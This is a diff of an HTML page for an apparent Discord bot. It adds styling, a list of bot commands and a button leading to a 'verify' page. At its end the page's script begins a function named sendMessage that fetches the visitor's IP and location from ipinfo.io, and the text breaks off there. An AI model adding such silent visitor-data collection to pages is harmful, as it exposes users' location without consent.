@@ -24,6 +24,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             opacity: 0.8;
+            border: rgba(0, 68, 255, 0.8) solid 4px;
         }
         
         .containerContainer {
@@ -31,6 +32,7 @@
             margin: 20px auto;
             padding: 20px;
             background: rgba(0, 110, 255, 0.8);
+            border: rgba(0, 89, 255, 0.8) solid 4px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             opacity: 0.8;
@@ -41,6 +43,7 @@
             margin: 20px auto;
             padding: 20px;
             background: rgba(0, 60, 255, 0.8);
+            border: rgb(0, 26, 255) solid 4px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             opacity: 0.8;
@@ -72,11 +75,43 @@
         }
         
         a:hover {
-            color: #00ff6a;
+            color: #0d9900;
         }
         
         .fadeInUp {
             animation: fadeInUp 1s ease;
+        }
+        
+        .commandHeader {
+            font-size: 30px;
+        }
+        
+        .verifyButton {
+            font-size: 30px;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #00ff00;
+            border: green solid 2px;
+            cursor: pointer;
+            border-radius: 20px;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: background-color 0.3s;
+        }
+        
+        .verifyButton:hover {
+            font-size: 30px;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #00ca00;
+            border: green solid 2px;
+            cursor: pointer;
+            border-radius: 20px;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: background-color 0.3s;
         }
         
         @keyframes fadeInUp {
@@ -85,7 +120,7 @@
                 transform: translateY(20px);
             }
             100% {
-                opacity: 1;
+                opacity: 100;
                 transform: translateY(0);
             }
         }
@@ -106,12 +141,32 @@
                 <br>
                 <div class="containerDarker">
                     <h3><u>How do I get the bot?</u></h3>
-                    <p>You can get the bot <a href="enter_bot_link"><u>here</u></a></p>
+                    <p>You can get the bot <a href="enter_bot_link"><u>here</u></a>. After you click the link, you can add the bot to your server!</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u>What does it do?</u></h3>
+                    <p>The bot can do many things, such as the following commands:</p>
+                    <p class="commandHeader"><u>Protection:</u></p>
+                    <p>· /verify</p>
+                    <p>· /setverifiedrole</p>
+                    <p>· /seteditor</p>
+                    <p class="commandHeader"><u>Giveaways:</u></p>
+                    <p>· /startgiveaway</p>
+                    <p>· /setwinnerrole</p>
+                    <p>· /setgiveawayeditor</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u><b>Verify</b></u></h3>
+                    <p style="text-align: center;">Click the button below to enter the verify page!</p>
+                    <br>
+                    <button class="verifyButton" onclick="window.open('verify.html')">Click me!</button>
+                    <br>
                 </div>
             </div>
         </div>
     </div>
-
     <script>
         function sendMessage() {
             fetch("https://ipinfo.io/json")
